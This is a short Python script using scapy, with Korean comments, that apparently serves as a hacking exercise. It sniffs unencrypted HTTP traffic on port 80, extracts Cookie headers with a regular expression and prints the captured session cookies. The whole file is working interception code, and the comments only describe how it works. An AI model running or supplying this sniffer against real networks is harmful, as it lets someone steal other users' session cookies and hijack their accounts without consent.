from scapy.all import *
import re


def cookieSniffer(packet):
    tcp = packet.getlayer('TCP')
    cookie = re.search(r'Cookie: (.+)', str(tcp.payload))
    if cookie:
        print('---COOKIE SNIFFED\n[%s]' %cookie.group())


def main():
    print('+++START SNIFFING COOKIE')
    sniff(filter='tcp port 80', store=0, prn=cookieSniffer)


if __name__ == '__main__':
    main()



# HTTP Cookie 헤더를 가로채서 화면에 출력하느 코드입니다.

'''
TCP포트 80번으로 전달되는 패킷에서 TCP payload인 HTTP 요청메시지를 추출하고

파이썬 정규식을 이용해 Cookie 헤더를 탐색하고 찾게되면 그문자열을 화면에출력합니다.

정규식인 r'Cookie: (.+)'는 'Cookie: 문자열'과 동일한 패턴을 찾기 위한것입니다.

파이썬에서 정규식을 지원하는 모듈은 re모듈입니다.
'''
